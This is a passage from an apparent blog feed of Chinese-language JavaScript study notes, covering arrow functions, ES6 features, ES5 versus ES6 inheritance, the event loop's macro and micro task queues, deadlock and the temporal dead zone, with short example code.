class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// 例子一</span><br><span class="line">let fun = (val) =&gt; &#123;</span><br><span class="line">    console.log(val);   // 111</span><br><span class="line">    // 下面一行会报错</span><br><span class="line">    // Uncaught ReferenceError: arguments is not defined</span><br><span class="line">    // 因为外层全局环境没有arguments对象</span><br><span class="line">    console.log(arguments); </span><br><span class="line">&#125;;</span><br><span class="line">fun(111);</span><br><span class="line"></span><br><span class="line">// 例子二</span><br><span class="line">function outer(val1, val2) &#123;</span><br><span class="line">    let argOut = arguments;</span><br><span class="line">    console.log(argOut);    // ①</span><br><span class="line">    let fun = () =&gt; &#123;</span><br><span class="line">        let argIn = arguments;</span><br><span class="line">        console.log(argIn);     // ②</span><br><span class="line">        console.log(argOut === argIn);  // ③</span><br><span class="line">    &#125;;</span><br><span class="line">    fun();</span><br><span class="line">&#125;</span><br><span class="line">outer(111, 222);</span><br></pre></td></tr></table></figure><p>上面例子二，①②③处的输出结果如下：</p><p><img src="http://files.shanqianche.cn/20228/1659514213304.png" alt="res"><br>很明显，普通函数outer内部的箭头函数fun中的arguments对象，其实是沿作用域链向上访问的外层outer函数的arguments对象。<br><strong>可以在箭头函数中使用rest参数代替arguments对象，来访问箭头函数的参数列表！！</strong></p><h2 id="箭头函数没有原型prototype"><a href="#箭头函数没有原型prototype" class="headerlink" title="箭头函数没有原型prototype"></a>箭头函数没有原型prototype</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let sayHi = () =&gt; &#123;</span><br><span class="line">    console.log(&#x27;Hello World !&#x27;)</span><br><span class="line">&#125;;</span><br><span class="line">console.log(sayHi.prototype); // undefined</span><br></pre></td></tr></table></figure><h2 id="箭头函数不能用作Generator函数，不能使用yeild关键字"><a href="#箭头函数不能用作Generator函数，不能使用yeild关键字" class="headerlink" title="箭头函数不能用作Generator函数，不能使用yeild关键字"></a>箭头函数不能用作Generator函数，不能使用yeild关键字</h2><h1 id="ES6新特性"><a href="#ES6新特性" class="headerlink" title="ES6新特性"></a>ES6新特性</h1><h2 id="变量和作用域"><a href="#变量和作用域" class="headerlink" title="变量和作用域"></a>变量和作用域</h2><h3 id="let-、const、-块级作用域和变量声明"><a href="#let-、const、-块级作用域和变量声明" class="headerlink" title="let 、const、 块级作用域和变量声明"></a>let 、const、 块级作用域和变量声明</h3><p>let声明的变量只在所在块中生效；<br>let声明的变量可以解决var与for循环结合使用产生的无法取得最新变量值的问题（<font color="#FF8C00">以往都需要通过闭包来解决这个问题</font>）；<br><font color="#FF00FF">let声明的变量不存在变量提升</font>（<font color="#FF00FF">从undefined-&gt;ReferenceError，其实也是一种暂时性死区</font>）、<font color="#bf242a">会造成变量暂时性死区(在声明let变量之前都不能用它)、也不允许重复声明</font>；</p><p>const声明的变量行为与let类似，只是多了两点更强的约束：<font color="#FF00FF">1.声明时必须赋值；2.声明的变量内存地址不可变</font>，需要注意的是：对于用const声明基本类型，值就保存在内存地址之中，意味着变量不可重新赋值；<font color="#FF00FF">对于用const声明的对象，对象内容还是可以更改的，只是不能改变其指向。（冻结对象应该用Object.freeze()）</font></p><h3 id="解构赋值（按照一定的结构解析出来进行赋值）"><a href="#解构赋值（按照一定的结构解析出来进行赋值）" class="headerlink" title="解构赋值（按照一定的结构解析出来进行赋值）"></a>解构赋值（按照一定的结构解析出来进行赋值）</h3><p>解构赋值的使用场景：<font color="#FF8C00">变量快捷赋值、提取数据、函数参数定义和默认值、遍历某结构</font></p><h2 id="原生对象的方法扩展"><a href="#原生对象的方法扩展" class="headerlink" title="原生对象的方法扩展"></a>原生对象的方法扩展</h2><ol><li><p>String<br>加强了对unicode的支持、支持字符串遍历（后面有讲到实际上是部署了iterator接口）、repeat()等方法的支持、模板字符串</p></li><li><p>RegExp<br>构造函数第一个参数是正则表达式，指定第二个参数不再报错、u修饰符、y修饰符、s修饰符</p></li><li><p>Number<br>二进制和八进制新写法、新方法parseInt()、<font color="#FF00FF">Number.EPSILON极小常量、安全整数、Math新方法</font></p></li><li><p>Function<br>函数参数默认值、rest参数、函数内部严格模式、函数的name属性、箭头函数</p></li><li><p>Array<br>扩展运算符…</p></li><li><p>Object 和 Symbol</p></li></ol><ul><li>Object对象<br>支持简写：同名属性K-V可以省略一个、<font color="#FF00FF">函数声明可以省略function</font>；支持属性名表达式、函数名表达 式。（注意：以上2个——<font color="#FF00FF">表达式和简写不能同时使用</font>）。</li></ul><p>对象的方法的name属性返回方法名，但有几个例外情况要小心。新增了Object方法<br>Object.is()——用于解决<code>==</code> 和<code>==</code>的部分兼容问题<br>Object.assign()——将src的所有可枚举对象属性复制到dest对象上（<font color="#FF8C00">浅复制</font>）<br>Object.setPrototypeOf()、Object.getPrototypeOf() (Object.__proto属性)<br>Object.entries()、Object.keys()、Object.values()</p><p>ES6中5种遍历对象属性的方法<br>for-in——<font color="#FF00FF">自身和继承</font>的可枚举属性（除Symbol）<br>Object.keys()——自身<font color="#FF00FF">非继承</font>的可枚举属性（除Symbol）<br>Object.getOwnPropertyNames()——<font color="#FF00FF">自身所有属性键名</font>（包括不可枚举、除Symbol）<br>Object.getOwnPropertySymbols()——自身的所有 Symbol 属性的键名<br>Reflect.ownKeys()——自身的所有键名</p><ul><li>Symbol类型<br>ES5以前，对象属性都只能是字符串，容易造成重命名导致的冲突。Symbol提供了一种机制，可以保存 属性名是独一无二的。Symbol类型的使用注意：1）<font color="#FF00FF">创建是调用函数，</font>而不是new关键字 2）Symbol类 型的属性不会被for-*、Object.keys()、Object.getPropertyNames()返回，可以用<font color="#FF00FF">后面两种</font>方法遍历。<h2 id="数据结构Set和Map"><a href="#数据结构Set和Map" class="headerlink" title="数据结构Set和Map"></a>数据结构Set和Map</h2>Set是一种类似数组的数据结构，区别在于其存储的成员都是不重复的，由此带来了它的一个应用就是：<font color="#FF8C00">去重</font>。Set通过new关键字实例化，入参可以是数组or<font color="#FF00FF">类数组的对象</font>。</li></ul><p>值得注意的是：在Set中，只能存储一个NaN，<font color="#FF00FF">这说明在Set数据结构中，NaN等于NaN</font>。</p><p>Set实例的方法：<font color="#FF8C00">操作方法add()、delete()、has()和clear()；遍历方法：keys()、values()、entries()和forEach();扩展运算符…、数组方法map()、filter()方法也可以用于Set结构</font>。由此它可以很方便的实现数组的交、并、差集。</p><p>WeakSet类似于Set，<strong>主要区别在于1.成员只能是对象类型；2.对象都是弱引用（如果其他对象都不再引用该对象，垃圾回收机制会自动回收该对象所占的内存，<font color="#FF00FF">不可预测何时会发生，故WeakSet不可被遍历</font>）</strong></p><p>JavaScript对象Object都是键值K-V对的集合，但<strong>K取值只能是字符串和Symbol</strong>，Map也是K-V的集合，然而其K可以取任意类型。如果需要键值对的集合，Map比Object更适合。Map通过new关键字实例化。</p><p>Map实例的方法：set()、get()、has()、delete()和clear();遍历方法同Set。</p><p>Map与其它数据结构的互相转换：Map &lt;—&gt; 数组| Map &lt;—&gt; 对象| Map &lt;—&gt; JSON。</p><p>WeakMap类似于Map，主要区别在于：<font color="#FF00FF">1.只接受对象作为键名；2.键名所指向的对象不计入垃圾回收机制</font>。</p><h2 id="元编程相关Proxy和Reflect"><a href="#元编程相关Proxy和Reflect" class="headerlink" title="元编程相关Proxy和Reflect"></a>元编程相关Proxy和Reflect</h2><h3 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h3><p>对目标对象加一层“拦截”（“代理”），外界对对象的访问、修改都必须先通过这层拦截层。因而它提供了 一个机制可以对外界的访问进行过滤和改写。</p><p>用法：var proxy = new Proxy(p1,p2); <strong>p1是要被代理的目标对象，p2是配置对象</strong>。</p><p>值得注意的是：TODO <font color="#FF00FF">Proxy不是对目标对象透明的代理——即使不做任何拦截的情况下无法保证代理对象与目 标对象行为的完全一致。（主要原因在于代理时，目标对象内部的this会指向代理对象）</font></p><h3 id="Reflect"><a href="#Reflect" class="headerlink" title="Reflect"></a>Reflect</h3><p>TODO<br>与Proxy一样是ES6为语言层面的用于操作对象提供的新API，目前它所拥有的对象方法与Proxy对象一一对应，引入目的：1.将Object对象上一些属于语言内部的方法放在Reflect上（目前都可以放）2.修改Object对象上某些方法的返回值，使得更加合理化（健壮）3.让Object对象的操作从命令式完全转化为函数式</p><h2 id="异步编程Promise、Generator和Async"><a href="#异步编程Promise、Generator和Async" class="headerlink" title="异步编程Promise、Generator和Async"></a>异步编程Promise、Generator和Async</h2><p>在JavaScript的世界里，对于异步编程存在如下几种方案：<font color="#FF8C00">1.回调函数；2.事件触发监听；3.发布订阅者模式；4.Promise。</font><br><font color="#228B22">首先介绍Promise，然后介绍ES6提供的生成器函数，async函数</font>。<br>Promise来源于社区，代表一个对象，它代表异步操作未来的一个结果（承诺）。它总共有三个状态，pending\fulfilled\rejected。另外，它的状态翻转路径只有两个：pending-&gt;fulfilled or pending-&gt;rejected，一旦状态翻转，就不可变了。它支持链式调用，支持错误传递，支持以同步代码的方式写异步操作。</p><p>Promise是一个对象，创建此对象实例的方法如下（可以理解resolve和reject是已返回的承诺对象未来回调函数的占位）</p><p>Generator函数是ES6提供的异步编程解决方案。对于Generator函数，可以将它理解为一个状态机，封装了多个内部状态；此外它还是一个遍历器生成函数，这个函数可以遍历出状态机的所有状态。</p><p>函数特征：关键字function与函数名之间有*，函数体内部yeild关键字。</p><p>生成器函数与普通函数的区别：<strong>函数调用后不执行，而是返回一个指针对象（遍历器对象）</strong>。调用对象的next()方法，执行一段yield逻辑。故函数的分段执行的，yield是暂停执行的标志，next()可以恢复执行。</p><p>yield与return的区别：<strong>yield有记忆功能</strong>，return没有；一个函数可以多次执行yeild，但只会return一次</p><p><font color="#FF00FF">async函数是Generator函数的语法糖，它进行了改进：1.自带执行器；2.返回值是Promise;</font></p><p><font color="#FF8C00">三家对比：使用Promise的异步代码存在大量自有API的调用，操作本身的语义夹杂其中，不是很清晰；Generator函数实现的异步代码语义比Promise清晰，但需要一个执行器；async函数的写法最简洁、符合语义，不需要执行器。</font></p><h2 id="语言层面类、模块的支持"><a href="#语言层面类、模块的支持" class="headerlink" title="语言层面类、模块的支持"></a>语言层面类、模块的支持</h2><h3 id="class"><a href="#class" class="headerlink" title="class"></a>class</h3><p>从 ES6 开始，JavaScript 提供了 class 关键字来定义类，尽管，这样的方案仍然是<strong>基于原型</strong>运行时系统的模拟，大部分功能ES5可以实现。</p><p>构造函数的prototype属性在 ES6 的“类”上面继续存在。事实上，类中所有方法都定义在类的prototype属性上面（因而也是不可枚举的）。</p><p>constructor方法是类的默认方法，通过new命令生成对象实例时，自动调用该方法。一个类必须有constructor方法，如果没有显式定义，一个空的constructor方法会被默认添加。（默认构造函数）；constructor方法默认返回实例对象（即this），完全可以指定返回另外一个对象。</p><p>注意区别：<font color="#FF00FF">类必须使用new调用，否则会报错。这是它跟普通构造函数的一个主要区别，后者不用new也可以执行。</font></p><p>类相当于实例的原型，所有在类中定义的方法，都会被实例继承。<font color="#FF00FF">如果在一个方法前，加上static关键字，就表示该方法不会被实例继承，而是直接通过类来调用，这就称为“静态方法”。</font></p><p>实例属性除了定义在constructor()方法里面的this上面，也可以定义在类的最顶层。</p><ul><li>私有属性和方法如何实现？1.命名上加以区别 2.将私有方法移出模块，利用公有方法调用；3.Symbol属性上（都不完美）<h3 id="module"><a href="#module" class="headerlink" title="module"></a>module</h3>在 ES6 之前，社区制定了一些模块加载方案，最主要的有 CommonJS 和 AMD 两种。前者用于服务器，后者用于浏览器。ES6 模块的设计思想是尽量的静态化，使得<font color="#FF00FF">编译时就能确定模块的依赖关系</font>，以及输入和输出的变量。CommonJS 和 AMD 模块，都只能在<font color="#FF00FF">运行时确定。</font></li></ul><p><strong>编译时加载VS运行时加载——对象VS代码</strong></p><p>模块命令：export和import；一个文件即为一个模块，除非导入否则外部无法读取模块属性；</p><p>export支持：变量、函数和类</p><p>export命令可以出现在模块的任何位置，只要处于模块顶层就可以。如果处于块级作用域内，就会报错，下一节的import命令也是如此。</p><p>输入的变量都是<font color="#FF8C00">只读</font>的，因为它的本质是输入接口。也就是说，不允许在加载模块的脚本里面，改写接口。由于import是<font color="#FF8C00">静态执行</font>，所以不能使用表达式和变量，这些只有在运行时才能得到结果的语法结构。</p><p>使用import命令的时候，<font color="#FF8C00">用户需要知道所要加载的变量名或函数名，否则无法加载</font>。但是，用户肯定希望快速上手，未必愿意阅读文档，去了解模块有哪些属性和方法。<font color="#FF00FF">为了给用户提供方便，让他们不用阅读文档就能加载模块，就要用到export default命令，为模块指定默认输出</font>。<br><font color="#FF00FF">模块之间也可以继承</font>。</p><h2 id="JS中对象分类、及其它原生对象"><a href="#JS中对象分类、及其它原生对象" class="headerlink" title="JS中对象分类、及其它原生对象"></a>JS中对象分类、及其它原生对象</h2><p><img src="http://files.shanqianche.cn/20228/1659517395135.png" alt="JS对象"></p><h2 id="Iterator"><a href="#Iterator" class="headerlink" title="Iterator"></a>Iterator</h2><p>ES6之前在JS中只有Array和对象可以表示“集合”这种数据结构，ES6中增加了 <strong>：Set和Map</strong>。由此，四种之间互相组合又可以定义新的数据结构。<strong>这些新定义的数据结构如何访问呢？遍历器（Iterator）就是这样一种机制</strong>。它是一种接口，为各种不同的数据结构提供统一的访问机制。<strong>任何数据结构只要部署 Iterator 接口，就可以完成遍历操作。<font color="#FF00FF">遍历器对象本质上是一个指针对象</font>。</strong></p><p>只要为某个数据结构部署了Iterator接口，则可以称此数据结构是可遍历的。iterator属性部署在Symbol上。如下对象默认部署了Iterator结口：Array Set Map String等。部署iterator结构的要点：<strong>1）在Symbol.iterator上部署；2）必须包含next()函数。默认调用iterator接口的场景：解构赋值、…扩展运算符、yeild</strong>* 。<font color="#FF8C00">for-of循环内部调用的即是调用数据机构内部的Symbol.iterator方法。</font></p><ul><li>for-in和for-of循环</li></ul><p>for-in用于遍历对象<font color="#FF8C00">属性</font>，对象自身和<font color="#FF8C00">继承</font>的可枚举属性（不可遍历Symbol属性）<br>for-of循环是一种遍历所有数据机构的<font color="#FF8C00">统一方法</font>。实现原理是数据结构上部署的Symbol.iterator属性。</p><h1 id="ES6-与-ES5-继承的区别"><a href="#ES6-与-ES5-继承的区别" class="headerlink" title="ES6 与 ES5 继承的区别"></a>ES6 与 ES5 继承的区别</h1><p>ES6 中有类 class 的概念，类 class 的继承是通过 extends 来实现的，ES5 中是<strong>通过设置构造函数的 prototype 属性</strong>，来实现继承的。</p><p>ES6 与 ES5 中的继承有 2 个区别，<font color="#FF8C00">第一个是，ES6 中子类会继承父类的属性</font>，<strong>第二个区别是，super() 与 A.call(this) 是不同的，在继承原生构造函数的情况下，体现得很明显，ES6 中的子类实例可以继承原生构造函数实例的<font color="#FF00FF">内部属性</font>，而在 ES5 中做不到。</strong></p><p><strong><font color="#228B22">下面通过 3 个 demo，来分析它们之间的区别。</font></strong></p><h2 id="ES5-继承"><a href="#ES5-继承" class="headerlink" title="ES5 继承"></a>ES5 继承</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function A() &#123;</span><br><span class="line">  this.a = &#x27;hello&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function B() &#123;</span><br><span class="line">  A.call(this);</span><br><span class="line">  this.b = &#x27;world&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">B.prototype = Object.create(A.prototype, &#123;</span><br><span class="line">  constructor: &#123; value: B, writable: true, configurable: true &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">let b = new B();</span><br></pre></td></tr></table></figure><p>代码中，构造函数 B 继承构造函数 A，<font color="#FF00FF">首先让构造函数 B 的 prototype 对象中的 proto 属性指向构造函数 A 的 prototype 对象</font>，并且<font color="#FF00FF">将构造函数 B 的 prototype 对象的 constructor 属性赋值为构造函数 B</font>，让构造函数 B 的实例继承构造函数 A 的原型对象上的属性，然后<font color="#FF00FF">在构造函数 B 内部的首行写上 A.call(this)，让构造函数 B 的实例继承构造函数 A 的实例属性</font>。在 ES5 中实现两个构造函数之间的继承，只需要做这两步即可【首先获取共享对象，其次继承上下文】。下面六幅图分别是，实例 b 的原型链及验证图，构造函数 B 的原型链及验证图，构造函数 A 的原型链及验证图。</p><p><img src="http://files.shanqianche.cn/20228/1659518038924.png" alt="实例 b 的原型链"><br><img src="https://files.shanqianche.cn/20228/1659530355038.png" alt="实例 b 的原型链验证图"></p><p><img src="https://files.shanqianche.cn/20228/1659530491136.png" alt="构造函数 B 的原型链图"></p><p><img src="https://files.shanqianche.cn/20228/1659530566896.png" alt="构造函数 A 的原型链图"></p><p><img src="https://files.shanqianche.cn/20228/1659530596049.png" alt="构造函数 B 的原型链"></p><p>从上面 6 幅图可知，构造函数 B 的实例 b 继承了构造函数 A 的实例属性，继承了构造函数 A 的原型对象上的属性，继承了构造函数 Object 的原型对象上的属性。<font color="#FF00FF">构造函数 B 是构造函数 Function 的实例，继承了构造函数 Function 的原型对象上的属性，继承了构造函数 Object 的原型对象上的属性。</font> 构造函数 A 是构造函数 Function 的实例，继承了构造函数 Function 的原型对象上的属性，继承了构造函数 Object 的原型对象上的属性。可看出，<font color="#FF00FF">构造函数 A 与 构造函数 B 并没有继承关系，即构造函数 B 没有继承构造函数 A 上面的属性</font>，在 ES6 中，用 extends 实现两个类的继承，两个类之间是有继承关系的，即子类继承了父类的方法，这是 ES6 与 ES5 继承的<font color="#9932CC">第一点区别</font>，下面通过 ES6 的继承来说明这一点。</p><h2 id="ES6-继承"><a href="#ES6-继承" class="headerlink" title="ES6 继承"></a>ES6 继承</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.a = &#x27;hello&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B extends A &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    super();</span><br><span class="line">    this.b = &#x27;world&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let b = new B();</span><br></pre></td></tr></table></figure><p>代码中，类 B 通过 extends 关键字继承类 A 的属性及其原型对象上的属性，通过在类 B 的 constructor 函数中执行 super() 函数，让类 B 的实例继承类 A 的实例属性，<font color="#FF00FF">super() 的作用类似构造函数 B 中的 A.call(this)，但它们是有区别的</font>，这是 ES6 与 ES5 继承的<font color="#9932CC">第二点区别</font>，这个区别会在文章的最后说明。在 ES6 中，两个类之间的继承就是通过 extends 和 super 两个关键字实现的。下面四幅图分别是，实例 b 的原型链及验证图，类 B 的原型链及验证图。</p><p><img src="https://files.shanqianche.cn/20228/1659530993293.png" alt="实例 b 的原型链"></p><p><img src="https://files.shanqianche.cn/20228/1659531008381.png" alt="实例 b 的原型链验证图"></p><p><img src="https://files.shanqianche.cn/20228/1659531025414.png" alt="类 B 的原型链图"></p><p><img src="https://files.shanqianche.cn/20228/1659531049372.png" alt="类 B 的原型链验证图"><br>通过上面 4 幅图可知，在 ES6 与 ES5 中，<font color="#FF8C00">类 B 的实例 b 的原型链与构造函数 B 的实例 b 的原型链是相同的，但是在 ES6 中类 B 继承了类 A 的属性，在 ES5 中，构造函数 B 没有继承构造函数 A 的属性，这是 ES6 与 ES5 继承的第一个区别。</font></p><p><strong>super() 与 A.call(this) 的区别</strong><br>在 ES5 中，构造函数 B 的实例继承构造函数 A 的实例属性是<strong>通过 A.call(this) 来实现</strong>的，在 ES6 中，类 B 的实例继承类 A 的实例属性，是<strong>通过 super() 实现</strong>的。<strong>在不是继承原生构造函数的情况下，A.call(this) 与 super() 在功能上是没有区别的</strong>，用 babel 在线转换 将类的继承转换成 ES5 语法，babel 也是通过 A.call(this) 来模拟实现 super() 的。<strong>但是在继承原生构造函数的情况下，A.call(this) 与 super() 在功能上是有区别的</strong>，<font color="#FF00FF">ES5 中 A.call(this) 中的 this 是构造函数 B 的实例，也就是在实现实例属性继承上，ES5 是先创造构造函数 B 的实例，然后在让这个实例通过 A.call(this) 实现实例属性继承，在 ES6 中，是先新建父类的实例对象this，然后再用子类的构造函数修饰 this，使得父类的所有行为都可以继承</font>。下面通过 2 段代码说明这个问题。</p><p><img src="https://files.shanqianche.cn/20228/1659531285963.png" alt="代码一"><br>这段代码的思路就是，<strong>让构造函数 MyArray 继承原生构造函数 Array，然后验证 MyArray 的实例是否具有 Array 实例的特性。</strong><br>从结果可以看出，MyArray 的实例并不具有 Array 实例的特性，之所以会发生这种情况，是<strong>因为 MyArray 的实例无法获得原生构造函数 Array 实例的内部属性</strong>，通过 Array.call(this) 也不行。</p><p><img src="https://files.shanqianche.cn/20228/1659531384336.png" alt="代码二"><br>从结果可以看出，通过 super()，MyArray 的实例具有 Array 实例的特性。</p><h1 id="哪些类型能被扩展操作符…扩展"><a href="#哪些类型能被扩展操作符…扩展" class="headerlink" title="哪些类型能被扩展操作符…扩展"></a>哪些类型能被扩展操作符…扩展</h1>]]></content>
    
    
    <summary type="html">每天/周学习计划</summary>
    
    
    
    <category term="plan" scheme="https://merlynr.github.io/categories/plan/"/>
    
    
    <category term="study" scheme="https://merlynr.github.io/tags/study/"/>
    
    <category term="graduate student" scheme="https://merlynr.github.io/tags/graduate-student/"/>
    
    <category term="plan" scheme="https://merlynr.github.io/tags/plan/"/>
    
    <category term="daily/weekly" scheme="https://merlynr.github.io/tags/daily-weekly/"/>
    
  </entry>
  
  <entry>
    <title>JS工作原理(第七天)</title>
    <link href="https://merlynr.github.io/2022/08/03/JS%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86(%E7%AC%AC%E4%B8%83%E5%A4%A9)/"/>
    <id>https://merlynr.github.io/2022/08/03/JS%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86(%E7%AC%AC%E4%B8%83%E5%A4%A9)/</id>
    <published>2022-08-02T16:00:00.000Z</published>
    <updated>2022-08-02T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="为什么js是单线程"><a href="#为什么js是单线程" class="headerlink" title="为什么js是单线程"></a>为什么js是单线程</h1><p>这主要和js的用途有关，js是作为浏览器的脚本语言，主要是实现用户与浏览器的交互，以及操作dom；这决定了它只能是单线程，否则会带来很复杂的同步问题。 <strong>举个例子：如果js被设计了多线程，如果有一个线程要修改一个dom元素，另一个线程要删除这个dom元素，此时浏览器就会一脸茫然，不知所措。</strong> 所以，为了避免复杂性，从一诞生，JavaScript就是单线程，这已经成了这门语言的核心特征，将来也不会改变</p><p><font color="#FF8C00">扩展：</font></p><p>什么是进程？<br>进程：是<font color="#FF8C00">cpu分配资源的最小单位</font>；（<font color="#FF8C00">是能拥有资源和独立运行的最小单位</font>）</p><p>什么是线程？<br>线程：<font color="#FF8C00">是cpu调度的最小单位；（线程是建立在进程的基础上的一次程序运行单位，一个进程中可以有多个线程</font>）</p><p>浏览器是多进程的？<br>放在浏览器中，<font color="#FF8C00">每打开一个tab页面，其实就是新开了一个进程，在这个进程中，还有ui渲染线程，js引擎线程，http请求线程等。 所以，浏览器是一个多进程的。</font></p><p><font color="#FF00FF">为了利用多核CPU的计算能力，HTML5提出Web Worker标准，允许JavaScript脚本创建多个线程，但是子线程完全受主线程控制，且不得操作DOM。所以，这个新标准并没有改变JavaScript单线程的本质</font>。</p><h1 id="宏微队列及执行顺序"><a href="#宏微队列及执行顺序" class="headerlink" title="宏微队列及执行顺序"></a>宏微队列及执行顺序</h1><p>JS 中用来存储待执行回调函数的队列包含 2 个不同特定的列队</p><ul><li>宏列队：用来保存待执行的宏任务（回调），比如：定时器回调、DOM 事件回调、ajax 回调</li><li>微列队：用来保存待执行的微任务（回调），比如：promise的回调、MutationObserver 的回调</li></ul><p>JS 执行时会区别这 2 个队列</p><ul><li>JS 引擎首先必须先执行所有的初始化同步任务代码</li><li><font color="#FF8C00">每次准备取出第一个宏任务执行前, 都要将所有的微任务一个一个取出来执行，也就是优先级比宏任务高，且与微任务所处的代码位置无关</font></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(() =&gt; &#123; //立即放入宏队列</span><br><span class="line">      console.log(&#x27;timeout callback1（）&#x27;)</span><br><span class="line">      Promise.resolve(3).then(</span><br><span class="line">        value =&gt; &#123; //立即放入微队列</span><br><span class="line">          console.log(&#x27;Promise onResolved3()&#x27;, value)</span><br><span class="line">        &#125;</span><br><span class="line">      )</span><br><span class="line">    &#125;, 0)</span><br><span class="line"></span><br><span class="line">    setTimeout(() =&gt; &#123; //立即放入宏队列</span><br><span class="line">      console.log(&#x27;timeout callback2（）&#x27;)</span><br><span class="line">    &#125;, 0)</span><br><span class="line"></span><br><span class="line">    Promise.resolve(1).then(</span><br><span class="line">      value =&gt; &#123; //立即放入微队列</span><br><span class="line">        console.log(&#x27;Promise onResolved1()&#x27;, value)</span><br><span class="line">        setTimeout(() =&gt; &#123;</span><br><span class="line">          console.log(&#x27;timeout callback3（）&#x27;, value)</span><br><span class="line">        &#125;, 0)</span><br><span class="line">      &#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    Promise.resolve(2).then(</span><br><span class="line">      value =&gt; &#123; //立即放入微队列</span><br><span class="line">        console.log(&#x27;Promise onResolved2()&#x27;, value)</span><br><span class="line">      &#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    // Promise onResolved1() 1</span><br><span class="line">    // Promise onResolved2() 2</span><br><span class="line">    // timeout callback1（）</span><br><span class="line">    // Promise onResolved3() 3</span><br><span class="line">    // timeout callback2（）</span><br><span class="line">    // timeout callback3（） 1</span><br></pre></td></tr></table></figure><h1 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h1><p><font color="#FF8C00">死锁是指两个或两个以上的进程在执行过程中，由于竞争资源而造成阻塞的现象，若无外力作用，它们都将无法继续执行</font></p><p><strong>产生原因</strong></p><ul><li>竞争资源引起进程死锁</li><li>可剥夺和非剥夺资源</li><li>竞争非剥夺资源</li><li>竞争临时性资源</li><li>进程推进顺序不当</li><li></li></ul><p><strong>产生条件</strong></p><ol><li>互斥条件：涉及的资源是非共享的<ul><li>涉及的资源是非共享的,一段时间内某资源只由一个进程占用,如果此时还有其它进程请求资源，则请求者只能等待，直至占有资源的进程用毕释放</li></ul></li><li>不剥夺条件：不能强行剥夺进程拥有的资源<ul><li>进程已获得的资源，在未使用完之前，不能被剥夺，只能在使用完时由自己释放</li></ul></li><li>请求和保持条件：进程在等待一新资源时继续占有已分配的资源<ul><li>指进程已经保持至少一个资源，但又提出了新的资源请求，而该资源已被其它进程占有，此时请求进程阻塞，但又对自己已获得的其它资源保持不放</li></ul></li><li>环路等待条件：存在一种进程的循环链，链中的每一个进程已获得的资源同时被链中的下一个进程所请求 在发生死锁时，必然存在一个进程——资源的环形链</li></ol><p><font color="#FF00FF">解决办法</font><br>只要打破四个必要条件之一就能有效预防死锁的发生</p><h1 id="暂时性死区"><a href="#暂时性死区" class="headerlink" title="暂时性死区"></a>暂时性死区</h1><p>暂时性死区的本质就是，<font color="#FF00FF">只要一进入当前作用域，所要使用的变量就已经存在了，但是不可获取，只有等到声明变量的那一行代码出现，才可以获取和使用该变量</font>。<br><strong>扩展：</strong><br>let 、const与暂时性死区</p><p>let或const声明的变量拥有暂时性死区（TDZ）：当进入它的作用域，它不能被访问（获取或设置）直到执行到达声明。</p><p>首先看看<font color="#FF8C00">不具有</font>暂时性死区的var：</p><ul><li>当进入var变量的作用域（包围它的函数）<strong>，立即为它创建（绑定）存储空间。变量会立即<font color="#FF00FF">被初始化并赋值</font>为undefined。</strong></li><li>当执行到变量声明的时候，如果变量定义了值则会被赋值。</li></ul><p>通过let声明的变量拥有暂时性死区，生命周期如下：</p><ul><li>当进入let变量的作用域（包围它的语法块），立即为它创建（绑定）存储空间。此时变量仍是<font color="#FF00FF">未初始化</font>的。</li><li>获取或设置未初始化的变量将抛出异常ReferenceError。</li><li>当执行到变量声明的时候，如果变量定义了值则会被赋值。如果没有定义值，则赋值为undefined。</li><li>const工作方式与let类似，但是**<font 